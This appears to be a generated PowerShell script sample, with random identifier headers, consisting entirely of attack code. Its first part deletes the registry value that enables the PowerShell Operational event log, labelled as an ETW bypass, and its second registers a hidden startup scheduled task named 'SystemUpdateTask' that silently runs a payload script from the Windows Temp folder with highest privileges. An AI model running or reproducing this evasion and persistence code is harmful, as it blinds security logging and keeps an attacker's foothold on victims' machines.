# YLVY6AJ4DD6Znq4gKjKu
# Generated: 2025-11-03T12:20:52.710644
# System: Huf1GPdy0F9Ptzg
# Process: TaoYQYHNJkn8


# ETW Bypass via Registry
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Winevt\Channels\Microsoft-Windows-PowerShell/Operational" -Name "Enabled" -ErrorAction SilentlyContinue



# Persistence via scheduled task
$taskName = "SystemUpdateTask"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File C:\Windows\Temp\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
